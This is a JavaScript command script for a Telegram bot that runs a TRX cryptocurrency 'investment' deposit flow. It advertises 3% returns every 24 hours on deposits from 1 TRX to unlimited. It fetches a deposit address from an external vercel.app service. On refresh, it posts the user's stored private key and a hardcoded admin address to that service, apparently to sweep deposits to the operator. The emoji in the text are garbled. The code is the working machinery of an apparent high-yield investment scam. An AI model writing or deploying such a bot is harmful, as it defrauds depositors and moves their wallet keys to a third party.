/*CMD
  command: Demode
  help: 
  need_reply: false
  auto_retry_time: 
  folder: 

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
CMD*/

if (request.data) {
  var message_id = request.message.message_id
  var chat_id = request.message.chat.id

  Api.deleteMessage({
    chat_id: chat_id,
    message_id: message_id
  })
}
var c = Bot.getProperty("currency")
var io = Bot.getProperty("dem")

var dear = Bot.getProperty("adura"+user.telegramid)
if (dear == undefined) {
  Bot.sendMessage("โ๏ธ*Hold on..... generating your Deposit address...*")
HTTP.get({
url:
    "https://tronb2.vercel.app",
  success: "getfirstusa"})
} else {
if (params == "r") {
var w = Bot.getProperty("aduras"+user.telegramid)

var addre = "TBYhyFYU6gszd9h5UBGAi9LWFJgntw7cdT"
HTTP.post( {
    url: "https://tronb2.vercel.app/easytrx",
    success: '/onIncomeTRX',
    body: {private_key: w,Admin_tron_address:addre}
})
return }


var state = Bot.getProperty("Deps")
if (state=="๐ Turned OFF"){
Bot.sendMessage("*โ๏ธ Deposit System is OFF* ")
return
}
var U = Bot.getProperty("Mindepo","โ๏ธ Not set")

var button = [[{title:"๐ Refresh Deposit", command:"Demode r"}]]
Bot.sendInlineKeyboard(button,"_๐ธ Welcome_ *" +user.first_name+ "* _! Here you can start a new investment!_\n\n*๐ธ We offer best Investment best for you!\n\n ๐ธminimum 1-Unlimited TRX\n ๐ธ 3% for Everyday day\n ๐ธ3.00% every 24 hours*\n ๐ธ Paid on Every 24 hours\n\nโ ๏ธ *If you send less than* `"+U+"` *TRX*, _your deposit will be igonred!โ Send the amount you want to deposit to the following address_\n\n`"+dear+"`"
)



 }
